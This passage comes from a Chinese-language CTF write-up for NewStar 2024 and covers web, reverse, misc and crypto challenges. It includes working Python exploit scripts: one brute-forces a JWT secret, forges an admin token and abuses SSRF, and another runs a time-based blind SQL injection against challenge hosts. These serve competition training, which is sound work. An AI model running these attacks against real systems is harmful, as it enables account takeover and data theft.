class="hljs-string">&quot;You have tried too many times! Please restart the service!&quot;</span>, <span class="hljs-number">403</span>)<br>        data = jwt.decode(token, secret_key, algorithms=[<span class="hljs-string">&quot;HS256&quot;</span>])<br>        <span class="hljs-keyword">if</span> data.get(<span class="hljs-string">&#x27;user&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>            failure_count += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>伪造需要secret_key，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">users = &#123;<br>    <span class="hljs-string">&#x27;admin&#x27;</span>: admin_pass,<br>    <span class="hljs-string">&#x27;amiya&#x27;</span>: <span class="hljs-string">&quot;114514&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>本段代码我们可以知道一个有效账户 <code>amiya</code>，密码 <code>114514</code>，通过发包登录，我们可以获得一个有效的 <code>token</code>，据此能在本地认证签名 <code>secret_key</code> 的有效性,爆破出 <code>secret_key</code>，然后查看登录后的逻辑：</p><p>前端请求 <code>/execute</code> 指定 <code>api_address</code>，而 <code>api_address</code> 可控且没有校验，存在 SSRF 漏洞。</p><p>利用 <code>/execute</code> 路由的 SSRF 漏洞让服务器自己访问</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> jwt<br><span class="hljs-keyword">import</span> sys<br><br>url = <span class="hljs-string">&quot;http://39.106.48.123:19369/&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_number_string</span>(<span class="hljs-params">number, length</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;number:<span class="hljs-number">0</span>&#123;length&#125;</span>&#125;&quot;</span><br><br>LENGTH = <span class="hljs-number">6</span><br><span class="hljs-keyword">try</span>:<br>    response = requests.post(url + <span class="hljs-string">&quot;login&quot;</span>, data=&#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;amiya&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;114514&quot;</span>&#125;)<br>    response.raise_for_status()<br>    token = response.cookies.get(<span class="hljs-string">&quot;token&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> token:<br>        sys.exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">except</span> requests.RequestException:<br>    sys.exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000000</span>):<br>    secret_key = get_number_string(i, LENGTH)<br>    <span class="hljs-keyword">try</span>:<br>        decoded = jwt.decode(token, secret_key, algorithms=[<span class="hljs-string">&quot;HS256&quot;</span>])<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span> jwt.exceptions.InvalidSignatureError:<br>        <span class="hljs-keyword">continue</span><br><br>fake_token = jwt.encode(&#123;<span class="hljs-string">&#x27;user&#x27;</span>: <span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>: <span class="hljs-built_in">int</span>(time.time()) + <span class="hljs-number">600</span>&#125;, secret_key)<br><br><span class="hljs-keyword">try</span>:<br>    flag_response = requests.get(url + <span class="hljs-string">&quot;execute?api_address=http://localhost:5001/fl4g&quot;</span>, cookies=&#123;<span class="hljs-string">&quot;token&quot;</span>: fake_token&#125;)<br>    flag_response.raise_for_status()<br>    <span class="hljs-built_in">print</span>(flag_response.text)<br><span class="hljs-keyword">except</span> requests.RequestException:<br>    <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><h2 id="re-3"><a class="markdownIt-Anchor" href="#re-3"></a> Re</h2><h3 id="pangbai-过家家3"><a class="markdownIt-Anchor" href="#pangbai-过家家3"></a> PangBai 过家家（3）</h3><p>大概流程参照<a href="https://www.cnblogs.com/demo41/p/18226496">Pyinstaller打包exe的反编译——LitCTF 2024（公开赛道）ezpython！！！！！ - demo41 - 博客园 (cnblogs.com)</a></p><p>首先把exe进行解包变成pyc文件，用这个项目，或者有在线网站</p><p><a href="https://github.com/extremecoders-re/pyinstxtractor">extremecoders-re/pyinstxtractor: PyInstaller Extractor (github.com)</a>，得到同名的pyc，然后再找个网站反编译文件</p><p><a href="https://pylingual.io/view_chimera?identifier=f63fac43765afc0144c06a74f7b63067d41bad9a413bc7f0369948c9ea30fd9f">反编译</a>，得到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Decompiled with PyLingual (https://pylingual.io)</span><br><span class="hljs-comment"># Internal filename: NotNormalExe.py</span><br><span class="hljs-comment"># Bytecode version: 3.12.0rc2 (3531)</span><br><span class="hljs-comment"># Source timestamp: 1970-01-01 00:00:00 UTC (0)</span><br><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Welcome to NewStar~&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Please input the flag:&#x27;</span>)<br>enc = [<span class="hljs-number">40</span>, <span class="hljs-number">9</span>, <span class="hljs-number">22</span>, <span class="hljs-number">52</span>, <span class="hljs-number">15</span>, <span class="hljs-number">56</span>, <span class="hljs-number">66</span>, <span class="hljs-number">71</span>, <span class="hljs-number">111</span>, <span class="hljs-number">121</span>, <span class="hljs-number">90</span>, <span class="hljs-number">33</span>, <span class="hljs-number">18</span>, <span class="hljs-number">40</span>, <span class="hljs-number">3</span>, <span class="hljs-number">13</span>, <span class="hljs-number">80</span>, <span class="hljs-number">28</span>, <span class="hljs-number">65</span>, <span class="hljs-number">68</span>, <span class="hljs-number">83</span>, <span class="hljs-number">88</span>, <span class="hljs-number">34</span>, <span class="hljs-number">86</span>, <span class="hljs-number">5</span>, <span class="hljs-number">12</span>, <span class="hljs-number">35</span>, <span class="hljs-number">82</span>, <span class="hljs-number">67</span>, <span class="hljs-number">3</span>, <span class="hljs-number">17</span>, <span class="hljs-number">79</span>]<br>key = <span class="hljs-string">&#x27;NewStar2024&#x27;</span><br><span class="hljs-built_in">input</span> = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">input</span>) != <span class="hljs-built_in">len</span>(enc):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Wrong flag, try again!&#x27;</span>)<br>    sys.exit(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">input</span>)):<br>    <span class="hljs-keyword">if</span> enc[i] != <span class="hljs-built_in">ord</span>(<span class="hljs-built_in">input</span>[i]) ^ <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)]):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Wrong flag, try again!&#x27;</span>)<br>        sys.exit(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Correct flag!&#x27;</span>)<br></code></pre></td></tr></table></figure><p>解密得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Given encrypted values</span><br>enc = [<span class="hljs-number">40</span>, <span class="hljs-number">9</span>, <span class="hljs-number">22</span>, <span class="hljs-number">52</span>, <span class="hljs-number">15</span>, <span class="hljs-number">56</span>, <span class="hljs-number">66</span>, <span class="hljs-number">71</span>, <span class="hljs-number">111</span>, <span class="hljs-number">121</span>, <span class="hljs-number">90</span>, <span class="hljs-number">33</span>, <span class="hljs-number">18</span>, <span class="hljs-number">40</span>, <span class="hljs-number">3</span>, <span class="hljs-number">13</span>, <span class="hljs-number">80</span>, <span class="hljs-number">28</span>, <span class="hljs-number">65</span>, <span class="hljs-number">68</span>, <span class="hljs-number">83</span>, <span class="hljs-number">88</span>, <span class="hljs-number">34</span>, <span class="hljs-number">86</span>, <span class="hljs-number">5</span>, <span class="hljs-number">12</span>, <span class="hljs-number">35</span>, <span class="hljs-number">82</span>, <span class="hljs-number">67</span>, <span class="hljs-number">3</span>, <span class="hljs-number">17</span>, <span class="hljs-number">79</span>]<br>key = <span class="hljs-string">&#x27;NewStar2024&#x27;</span><br><br><span class="hljs-comment"># Decrypting the flag</span><br>flag = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    <span class="hljs-comment"># Compute the corresponding character</span><br>    char = <span class="hljs-built_in">chr</span>(enc[i] ^ <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)]))<br>    flag.append(char)<br><br><span class="hljs-comment"># Join the list into a string</span><br>decrypted_flag = <span class="hljs-string">&#x27;&#x27;</span>.join(flag)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Decrypted flag:&#x27;</span>, decrypted_flag)<br><span class="hljs-comment">#  flag&#123;Y0u_Know_Py1nstall3r_W311!&#125;</span><br></code></pre></td></tr></table></figure><h2 id="misc-3"><a class="markdownIt-Anchor" href="#misc-3"></a> Misc</h2><h3 id="bgm坏了吗"><a class="markdownIt-Anchor" href="#bgm坏了吗"></a> BGM坏了吗？</h3><p>用aud检测一下，在最后十秒内有电话播音，可以提取这段音频，用工具得到</p><p><img src="/../../images/Newstar/2024/38.png" alt="38"></p><h3 id="amazinggame"><a class="markdownIt-Anchor" href="#amazinggame"></a> AmazingGame</h3><p>jeb直接秒，游戏挺好玩的，base64解密</p><p><img src="/../../images/Newstar/2024/39.png" alt="39"></p><h3 id="osint-master"><a class="markdownIt-Anchor" href="#osint-master"></a> OSINT-MASTER</h3><p>飞机定位可以看到是B-2419,查一下飞机的航班的飞行时间定位具体航班</p><p><img src="/../../images/Newstar/2024/41.png" alt="41"></p><p>看一下对应的航班</p><p><img src="/../../images/Newstar/2024/40.png" alt="40"></p><p>根据图片下面有个弯道河简单定位一下是济宁市</p><p>flag{MU5156_济宁市}</p><h3 id="ez_jai"><a class="markdownIt-Anchor" href="#ez_jai"></a> ez_jai</h3><p>测试了一会发现了花括号可以用<code>&lt;%%&gt;</code>进行绕过</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">user_code</span><span class="hljs-params">()</span> &lt;%<br>    <span class="hljs-title function_">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;Hello, World!&quot;</span>)</span>;<br>%&gt;<br></code></pre></td></tr></table></figure><p><img src="/../../images/Newstar/2024/43.png" alt="43"></p><h2 id="crypto-3"><a class="markdownIt-Anchor" href="#crypto-3"></a> Crypto</h2><h3 id="故事新编1"><a class="markdownIt-Anchor" href="#故事新编1"></a> 故事新编1</h3><p>先解密维吉尼亚密码，根据后面的无序尾猜测位数</p><p><img src="/../../images/Newstar/2024/42.png" alt="42"></p><p>得到之后一直在尝试但是一直没解出来，明显是出题人问题，有存在一个换行符</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br>zen1  = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">BEAUTIFUL IS BETTER THAN UGLY.</span><br><span class="hljs-string">EXPLICIT IS BETTER THAN IMPLICIT.</span><br><span class="hljs-string">SIMPLE IS BETTER THAN COMPLEX.</span><br><span class="hljs-string">COMPLEX IS BETTER THAN COMPLICATED.</span><br><span class="hljs-string">FLAT IS BETTER THAN NESTED.</span><br><span class="hljs-string">SPARSE IS BETTER THAN DENSE.</span><br><span class="hljs-string">FLAGA IS VEGENERE</span><br><span class="hljs-string">READABILITY COUNTS.</span><br><span class="hljs-string">SPECIAL CASES AREN&#x27;T SPECIAL ENOUGH TO BREAK THE RULES.</span><br><span class="hljs-string">ALTHOUGH PRACTICALITY BEATS PURITY.</span><br><span class="hljs-string">ERRORS SHOULD NEVER PASS SILENTLY.</span><br><span class="hljs-string">UNLESS EXPLICITLY SILENCED.</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>key1 = <span class="hljs-string">&quot;SUBTITUTION&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">enc1</span>(<span class="hljs-params">plaintext, key</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">shift_char</span>(<span class="hljs-params">c, k</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">chr</span>(((<span class="hljs-built_in">ord</span>(c) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) + (<span class="hljs-built_in">ord</span>(k) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>))) % <span class="hljs-number">26</span>) + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>))<br><br>    plaintext = plaintext.upper()<br>    key = key.upper()<br>    ciphertext = []<br>    key_index = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> plaintext:<br>        <span class="hljs-keyword">if</span> char.isalpha():<br>            ciphertext.append(shift_char(char, key[key_index % <span class="hljs-built_in">len</span>(key)]))<br>            key_index += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            ciphertext.append(char)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(ciphertext)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;enc = \&#x27;\&#x27;\&#x27;&#x27;</span> + enc1(zen1, key1)+<span class="hljs-string">&#x27;\&#x27;\&#x27;\&#x27;&#x27;</span>)<br>flag = <span class="hljs-string">b&#x27;flag&#123;&#x27;</span>+md5(zen1.encode()).hexdigest().encode()+<span class="hljs-string">b&#x27;&#125;&#x27;</span><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h3 id="故事新编2"><a class="markdownIt-Anchor" href="#故事新编2"></a> 故事新编2</h3><p>参照1也是先解再解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br>zen2 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">IN THE FACE OF AMBIGUITY, REFUSE THE TEMPTATION TO GUESS.</span><br><span class="hljs-string">THERE SHOULD BE ONE-- AND PREFERABLY ONLY ONE --OBVIOUS WAY TO DO IT.</span><br><span class="hljs-string">ALTHOUGH THAT WAY MAY NOT BE OBVIOUS AT FIRST UNLESS YOU&#x27;RE DUTCH.</span><br><span class="hljs-string">NOW IS BETTER THAN NEVER.</span><br><span class="hljs-string">ALTHOUGH NEVER IS OFTEN BETTER THAN RIGHT NOW.</span><br><span class="hljs-string">IF THE IMPLEMENTATION IS HARD TO EXPLAIN, IT&#x27;S A BAD IDEA.</span><br><span class="hljs-string">IF THE IMPLEMENTATION IS EASY TO EXPLAIN, IT MAY BE A GOOD IDEA.</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>key2 =<span class="hljs-string">&#x27;supersubtitution&#x27;</span><br>dict1 = &#123;<span class="hljs-string">&#x27;A&#x27;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;B&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;C&#x27;</span>: <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;D&#x27;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;E&#x27;</span>: <span class="hljs-number">4</span>,<br>         <span class="hljs-string">&#x27;F&#x27;</span>: <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;G&#x27;</span>: <span class="hljs-number">6</span>, <span class="hljs-string">&#x27;H&#x27;</span>: <span class="hljs-number">7</span>, <span class="hljs-string">&#x27;I&#x27;</span>: <span class="hljs-number">8</span>, <span class="hljs-string">&#x27;J&#x27;</span>: <span class="hljs-number">9</span>,<br>         <span class="hljs-string">&#x27;K&#x27;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;L&#x27;</span>: <span class="hljs-number">11</span>, <span class="hljs-string">&#x27;M&#x27;</span>: <span class="hljs-number">12</span>, <span class="hljs-string">&#x27;N&#x27;</span>: <span class="hljs-number">13</span>, <span class="hljs-string">&#x27;O&#x27;</span>: <span class="hljs-number">14</span>,<br>         <span class="hljs-string">&#x27;P&#x27;</span>: <span class="hljs-number">15</span>, <span class="hljs-string">&#x27;Q&#x27;</span>: <span class="hljs-number">16</span>, <span class="hljs-string">&#x27;R&#x27;</span>: <span class="hljs-number">17</span>, <span class="hljs-string">&#x27;S&#x27;</span>: <span class="hljs-number">18</span>, <span class="hljs-string">&#x27;T&#x27;</span>: <span class="hljs-number">19</span>,<br>         <span class="hljs-string">&#x27;U&#x27;</span>: <span class="hljs-number">20</span>, <span class="hljs-string">&#x27;V&#x27;</span>: <span class="hljs-number">21</span>, <span class="hljs-string">&#x27;W&#x27;</span>: <span class="hljs-number">22</span>, <span class="hljs-string">&#x27;X&#x27;</span>: <span class="hljs-number">23</span>, <span class="hljs-string">&#x27;Y&#x27;</span>: <span class="hljs-number">24</span>, <span class="hljs-string">&#x27;Z&#x27;</span>: <span class="hljs-number">25</span>&#125;<br><br>dict2 = &#123;<span class="hljs-number">0</span>: <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-number">1</span>: <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-number">2</span>: <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-number">3</span>: <span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-number">4</span>: <span class="hljs-string">&#x27;E&#x27;</span>,<br>         <span class="hljs-number">5</span>: <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-number">6</span>: <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-number">7</span>: <span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-number">8</span>: <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-number">9</span>: <span class="hljs-string">&#x27;J&#x27;</span>,<br>         <span class="hljs-number">10</span>: <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-number">11</span>: <span class="hljs-string">&#x27;L&#x27;</span>, <span class="hljs-number">12</span>: <span class="hljs-string">&#x27;M&#x27;</span>, <span class="hljs-number">13</span>: <span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-number">14</span>: <span class="hljs-string">&#x27;O&#x27;</span>,<br>         <span class="hljs-number">15</span>: <span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-number">16</span>: <span class="hljs-string">&#x27;Q&#x27;</span>, <span class="hljs-number">17</span>: <span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-number">18</span>: <span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-number">19</span>: <span class="hljs-string">&#x27;T&#x27;</span>,<br>         <span class="hljs-number">20</span>: <span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-number">21</span>: <span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-number">22</span>: <span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-number">23</span>: <span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-number">24</span>: <span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-number">25</span>: <span class="hljs-string">&#x27;Z&#x27;</span>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_key</span>(<span class="hljs-params">message, key</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(message)):<br>        <span class="hljs-keyword">if</span> message[i].isalpha() == <span class="hljs-literal">False</span>:<br>            <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">else</span>:<br>            key += message[i]<br>    <span class="hljs-keyword">return</span> key<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">enc2</span>(<span class="hljs-params">message, key</span>):<br>    message = message.upper()<br>    key = key.upper()<br>    key_new = generate_key(message, key)<br>    cipher_text = <span class="hljs-string">&#x27;&#x27;</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> letter <span class="hljs-keyword">in</span> message:<br>        <span class="hljs-keyword">if</span> letter.isalpha():<br>            x = (dict1[letter]+dict1[key_new[i]]) % <span class="hljs-number">26</span><br>            i += <span class="hljs-number">1</span><br>            cipher_text += dict2[x]<br>        <span class="hljs-keyword">else</span>:<br>            cipher_text += letter<br>    <span class="hljs-keyword">return</span> cipher_text<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;enc = \&#x27;\&#x27;\&#x27;&#x27;</span> + enc2(zen2, key2)+<span class="hljs-string">&#x27;\&#x27;\&#x27;\&#x27;&#x27;</span>)<br>flag = <span class="hljs-string">b&#x27;flag&#123;&#x27;</span>+md5(zen2.encode()).hexdigest().encode()+<span class="hljs-string">b&#x27;&#125;&#x27;</span><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h1 id="week4"><a class="markdownIt-Anchor" href="#week4"></a> week4</h1><h2 id="web-4"><a class="markdownIt-Anchor" href="#web-4"></a> web</h2><h3 id="blindsql2"><a class="markdownIt-Anchor" href="#blindsql2"></a> blindsql2</h3><p>其实我的week3就是对的只是默认不匹配除<code>_</code>的字符导致我以为爆出来的表只有一个，现在上一下这周的脚本吧，f脚本需要多跑几次才能出准确的flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br>dicts = string.ascii_letters + string.digits + <span class="hljs-string">&quot;_&quot;</span>+<span class="hljs-string">&quot;-&quot;</span>+<span class="hljs-string">&quot;&#123;&quot;</span>+<span class="hljs-string">&quot;&#125;&quot;</span>+<span class="hljs-string">&quot;,&quot;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&#x27;http://eci-2ze1c97lhjoq1bd4ebwl.cloudeci1.ichunqiu.com/&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag_char</span>(<span class="hljs-params">index</span>):<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> dicts:<br>        <span class="hljs-comment">#payload = f&quot;-1&#x27;||(if(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),&#123;index&#125;,1)like(&#x27;&#123;char&#125;&#x27;),sleep(0.5),0))#&quot;</span><br>        <span class="hljs-comment">#payload = f&quot;-1&#x27;||(if(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name)like(\&#x27;secrets\&#x27;)),&#123;index&#125;,1)like(&#x27;&#123;char&#125;&#x27;),sleep(0.5),0))#&quot;</span><br>        <span class="hljs-comment"># id,secret_key,secret_value</span><br>        <span class="hljs-comment">#最终情况: i_want_a_girlfriend_i_want_to_beWa_good_ctfer_flag__b_cbb___b_f</span><br>        payload = <span class="hljs-string">f&quot;-1&#x27;||(if(mid((select(group_concat(secret_value))from(secrets)where((secret_value)like(&#x27;flag%&#x27;))),<span class="hljs-subst">&#123;index&#125;</span>,1)like(&#x27;<span class="hljs-subst">&#123;char&#125;</span>&#x27;),sleep(0.5),0))#&quot;</span><br>        <span class="hljs-comment">#flag&#123;2b4cbb60-b6ff-4e2f-ab20-e9c5bc964f91&#125;</span><br>        <span class="hljs-comment">#flag&#123;2b4cbb60-b6ff-4e2f-ab20-e9c5b1364f91&#125;</span><br>        <span class="hljs-comment">#flag&#123;2b4cbb60-b6ff-4e2f-ab20-e9c5b1964f91&#125;</span><br>        params = &#123;<span class="hljs-string">&#x27;student_name&#x27;</span>: payload&#125;<br>        <span class="hljs-keyword">try</span>:<br>            start_time = time.time()<br>            r = requests.get(url=url, params=params)<br>            end_time = time.time()<br>            sub = end_time - start_time<br>            <span class="hljs-keyword">if</span> sub &gt;= <span class="hljs-number">0.5</span>:<br>                <span class="hljs-keyword">return</span> char<br>        <span class="hljs-keyword">except</span> requests.RequestException <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">64</span>):<br>    char = get_flag_char(i)<br>    <span class="hljs-keyword">if</span> char:<br>        flag += char<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;当前情况: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span 